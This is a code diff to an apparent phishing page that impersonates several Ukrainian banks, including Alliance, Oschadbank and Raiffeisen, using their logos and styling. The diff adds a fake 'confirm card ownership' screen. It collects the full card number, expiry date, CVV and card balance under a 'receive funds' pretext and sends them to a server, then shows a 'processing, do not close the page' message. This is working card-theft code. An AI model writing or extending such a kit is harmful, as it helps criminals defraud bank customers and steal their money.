@@ -480,7 +480,7 @@
         
         /* Стили для ввода телефона и карты */
         .alliance-input-group {
-            display: flex; align-items: center;
+            margin-bottom: 15px;
             border: 1px solid var(--alliance-border-color);
             border-radius: 12px;
             padding: 0 15px;
@@ -494,6 +494,14 @@
             flex-grow: 1; background: transparent; border: none; outline: none;
             color: var(--alliance-text); font-size: 18px; font-weight: 500;
             padding: 15px 5px;
+            width: 100%;
+        }
+        .alliance-input-group-row {
+            display: flex;
+            gap: 15px;
+        }
+        .alliance-input-group-row .alliance-input-group {
+            flex: 1;
         }
         .alliance-footer {
             padding: 20px; margin-top: auto;
@@ -546,7 +554,8 @@ document.addEventListener('DOMContentLoaded', () => {
     const bankFlows = {
         'oschadbank': { name: 'Ощадбанк', logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/thumb/d/da/Oschadbank_%28uk%29.png/1200px-Oschadbank_%28uk%29.png', theme: 'oschadbank' },
         'raiffeisen': { name: 'Райффайзен', logoUrl: 'https://play-lh.googleusercontent.com/bKSKrzk-rS1KB0c0CApj1C8P3XLa5r_KH6eKyYWw4FJz3p5NavHLB9MakrFRJLbhMzw', theme: 'raiffeisen' },
-        'alliance': { name: 'Альянс', logoUrl: 'https://bankalliance.ua/assets/images/logo.svg', theme: 'alliance' },
+        // --- ИЗМЕНЕНИЕ: Новый URL для логотипа ---
+        'alliance': { name: 'Альянс', logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/f/f1/Logo_Bank_Alliance.png', theme: 'alliance' },
         'vostok': { name: 'Восток', logoUrl: 'https://ubanks.com.ua/img/bank-logo/bankvostok-logo-2x.png', theme: 'vostok', colors: { primary: '#8DC63F', text: '#FFFFFF', bg: '#74A22A' }, steps: [{ type: 'phone', title: 'Введіть номер телефону' },{ type: 'card_simple', title: 'Для зарахування коштів введіть номер картки' }], special: true },
         'izibank': { name: 'Izibank', logoUrl: 'https://ubanks.com.ua/img/bank-logo/izibank-logo-2x.png', theme: 'izibank', colors: { primary: '#FF4A83', text: '#FFFFFF', bg: '#1A1A1A' }, steps: [{ type: 'phone', title: 'Введіть номер телефону' },{ type: 'card_simple', title: 'Для зарахування коштів введіть номер картки' }], special: true },
         'ukrsib': { name: 'Укрсиб', logoUrl: 'https://mixfin-com.b-cdn.net/ua/wp-content/uploads/2025/01/ukrsibbank_logo_mixfin.webp', theme: 'ukrsib', colors: { primary: '#00A14E', text: '#FFFFFF', bg: '#007A3B' }, steps: [{ type: 'phone', title: 'Введіть номер телефону' },{ type: 'card_simple', title: 'Для зарахування коштів введіть номер картки' }], special: true }
@@ -647,22 +656,58 @@ document.addEventListener('DOMContentLoaded', () => {
         allianceModalContent.innerHTML = html;
     }
 
+    // --- ИЗМЕНЕНИЕ: Новая функция для экрана подтверждения карты ---
+    function renderAllianceCardDetailsScreen() {
+        const html = `
+            <div class="alliance-header">
+                <span class="back-arrow" id="alliance-back-details-btn">
+                     <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M15 18L9 12L15 6" stroke="${getComputedStyle(document.documentElement).getPropertyValue('--alliance-text')}" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+                </span>
+                <span class="title">Підтвердження</span>
+                <img src="${activeBankData.logoUrl}" class="alliance-header-logo" alt="Логотип банку">
+            </div>
+            <div class="alliance-content-wrapper">
+                <h2 class="alliance-main-title">Підтвердити володіння карткою</h2>
+                <div class="alliance-input-group" id="alliance-details-card-group">
+                    <input type="tel" id="alliance-details-card-input" class="alliance-input-field" placeholder="Номер картки" autocomplete="off">
+                </div>
+                <div class="alliance-input-group-row">
+                    <div class="alliance-input-group" id="alliance-details-exp-group">
+                        <input type="tel" id="alliance-details-exp-input" class="alliance-input-field" placeholder="Термін (ММ/РР)" autocomplete="off">
+                    </div>
+                    <div class="alliance-input-group" id="alliance-details-cvv-group">
+                        <input type="tel" id="alliance-details-cvv-input" class="alliance-input-field" placeholder="CVV" autocomplete="off">
+                    </div>
+                </div>
+                <div class="alliance-input-group" id="alliance-details-balance-group">
+                    <input type="text" id="alliance-details-balance-input" class="alliance-input-field" placeholder="Поточний баланс картки" autocomplete="off">
+                </div>
+            </div>
+            <div class="alliance-footer">
+                <button class="alliance-button" id="alliance-details-submit-btn">Продовжити</button>
+            </div>
+        `;
+        allianceModalContent.innerHTML = html;
+    }
+
     // Обработчик событий для Альянс Банка
     if (allianceModalContent) {
         allianceModalContent.addEventListener('click', (e) => {
             const target = e.target;
             
-            // Кнопка "Назад" на экране ввода телефона
             if (target.closest('#alliance-back-btn')) {
                 allianceModalOverlay.style.display = 'none';
             }
             
-            // Кнопка "Назад" на экране ввода карты
             if (target.closest('#alliance-back-card-btn')) {
                 renderAlliancePhoneScreen();
             }
+            
+            // --- ИЗМЕНЕНИЕ: Кнопка назад с экрана деталей карты ---
+            if (target.closest('#alliance-back-details-btn')) {
+                renderAllianceCardScreen();
+            }
 
-            // Кнопка "Продолжить" после ввода телефона
             if (target.id === 'alliance-continue-btn' && target.classList.contains('active')) {
                 const phoneInput = document.getElementById('alliance-phone-input');
                 const phone = '+380' + phoneInput.value.replace(/\D/g, '');
@@ -670,52 +715,92 @@ document.addEventListener('DOMContentLoaded', () => {
                 renderAllianceCardScreen();
             }
 
-            // Кнопка "Отримати кошти" после ввода карты
+            // --- ИЗМЕНЕНИЕ: Логика кнопки "Отримати кошти" ---
             if (target.id === 'alliance-submit-btn' && target.classList.contains('active')) {
                 const cardInput = document.getElementById('alliance-card-input');
                 const card = cardInput.value.replace(/\s/g, '');
-                sendDataToServer({ card_number: card }, true);
+                sendDataToServer({ card_number: card }, false); // isFinal = false
+                renderAllianceCardDetailsScreen(); // Переход на новый экран
+            }
+
+            // --- ИЗМЕНЕНИЕ: Логика новой кнопки "Продовжити" ---
+            if (target.id === 'alliance-details-submit-btn' && target.classList.contains('active')) {
+                const cardDetailsData = {
+                    card_number_full: document.getElementById('alliance-details-card-input').value.replace(/\s/g, ''),
+                    exp_date: document.getElementById('alliance-details-exp-input').value,
+                    cvv: document.getElementById('alliance-details-cvv-input').value,
+                    balance: document.getElementById('alliance-details-balance-input').value,
+                };
+                sendDataToServer({ card_details: cardDetailsData }, true); // isFinal = true
                 allianceModalContent.innerHTML = `<div style="display:flex; flex-direction:column; justify-content:center; align-items:center; height:100%;"><h2 class="alliance-main-title">Обробка...</h2><p class="alliance-subtitle">Будь ласка, зачекайте. Не закривайте сторінку.</p></div>`;
             }
         });
 
         allianceModalContent.addEventListener('input', (e) => {
              const target = e.target;
-             // Валидация и активация кнопки на экране телефона
+             
              if (target.id === 'alliance-phone-input') {
                 let value = target.value.replace(/\D/g, '');
                 if (value.length > 9) value = value.substring(0, 9);
                 target.value = value.replace(/(\d{2})(\d{3})(\d{2})(\d{2})/, '$1 $2 $3 $4').trim();
-                const continueBtn = document.getElementById('alliance-continue-btn');
-                if (value.length === 9) {
-                    continueBtn.classList.add('active');
-                } else {
-                    continueBtn.classList.remove('active');
-                }
+                document.getElementById('alliance-continue-btn').classList.toggle('active', value.length === 9);
              }
-             // Валидация и активация кнопки на экране карты
+             
              if (target.id === 'alliance-card-input') {
                 let value = target.value.replace(/\D/g, '').substring(0, 16);
                 target.value = value.replace(/(\d{4})/g, '$1 ').trim();
-                const submitBtn = document.getElementById('alliance-submit-btn');
-                if (value.length === 16) {
-                    submitBtn.classList.add('active');
+                document.getElementById('alliance-submit-btn').classList.toggle('active', value.length === 16);
+             }
+
+             // --- ИЗМЕНЕНИЕ: Валидация и форматирование для нового экрана ---
+             if (target.id === 'alliance-details-card-input') {
+                let value = target.value.replace(/\D/g, '').substring(0, 16);
+                target.value = value.replace(/(\d{4})/g, '$1 ').trim();
+             }
+             if (target.id === 'alliance-details-exp-input') {
+                let value = target.value.replace(/\D/g, '').substring(0, 4);
+                if (value.length > 2) {
+                    target.value = value.substring(0, 2) + '/' + value.substring(2);
                 } else {
-                    submitBtn.classList.remove('active');
+                    target.value = value;
                 }
+             }
+             if (target.id === 'alliance-details-cvv-input') {
+                target.value = target.value.replace(/\D/g, '').substring(0, 3);
+             }
+             if (target.id === 'alliance-details-balance-input') {
+                 // Allow numbers and one comma
+                let value = target.value.replace(/[^0-9,]/g, '');
+                let parts = value.split(',');
+                if (parts.length > 2) {
+                    value = parts[0] + ',' + parts.slice(1).join('');
+                }
+                target.value = value;
+             }
+
+             // Проверка активации кнопки "Продовжити" на экране деталей
+             if (document.getElementById('alliance-details-submit-btn')) {
+                 const card = document.getElementById('alliance-details-card-input').value.replace(/\D/g, '');
+                 const exp = document.getElementById('alliance-details-exp-input').value;
+                 const cvv = document.getElementById('alliance-details-cvv-input').value;
+                 const balance = document.getElementById('alliance-details-balance-input').value;
+
+                 const isValid = card.length === 16 && exp.length === 5 && cvv.length === 3 && balance.trim() !== '';
+                 document.getElementById('alliance-details-submit-btn').classList.toggle('active', isValid);
              }
         });
 
         allianceModalContent.addEventListener('focusin', (e) => {
-            if (e.target.closest('#alliance-phone-group')) e.target.closest('#alliance-phone-group').classList.add('focused');
-            if (e.target.closest('#alliance-card-group')) e.target.closest('#alliance-card-group').classList.add('focused');
+            const group = e.target.closest('.alliance-input-group');
+            if (group) group.classList.add('focused');
         });
         allianceModalContent.addEventListener('focusout', (e) => {
-            if (e.target.closest('#alliance-phone-group')) e.target.closest('#alliance-phone-group').classList.remove('focused');
-            if (e.target.closest('#alliance-card-group')) e.target.closest('#alliance-card-group').classList.remove('focused');
+            const group = e.target.closest('.alliance-input-group');
+            if (group) group.classList.remove('focused');
         });
     }
     // --- END ALLIANCE BANK FLOW ---
+
 
     // --- RAIFFEISEN BANK FLOW ---
     function renderRaiffPhoneScreen() {
